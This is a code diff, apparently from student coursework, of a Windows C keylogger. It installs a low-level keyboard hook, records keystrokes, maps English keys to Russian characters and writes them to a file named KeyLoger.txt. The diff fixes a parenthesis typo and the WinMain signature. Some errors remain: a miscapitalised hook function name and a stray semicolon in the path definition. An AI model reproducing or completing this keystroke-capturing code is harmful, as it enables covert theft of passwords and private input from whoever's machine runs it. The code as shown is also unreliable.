@@ -1,6 +1,6 @@
 #include <Windows.h>
 #include <stdio.h>
-#define PATH "fgr"
+#define PATH L"X:\\4 курс\\программы\\KeyLoger.txt";
 #define RUS 1049
 #define ENG 1033
 #define SIZE_STR 20
@@ -10,7 +10,7 @@ LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam);
 VOID WriteToFile(LPWSTR wrst);
 WCHAR EnToRus(WCHAR c);
 
-int WINAPI WinMain()
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
 	HHOOK hHook = SetWindowsHookexW(WH_KEYBOARD_LL, LogKey, NULL, NULL);
 	MSG msg = { 0 };
@@ -60,7 +60,7 @@ LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)
 		}
 		free(KeyString);
 	}
-	return CallNextHookEx)NULL, iCode, wParam, lParam);
+	return CallNextHookEx(NULL, iCode, wParam, lParam);
 }
 VOID WriteToFile(LPWSTR wstr)
 {
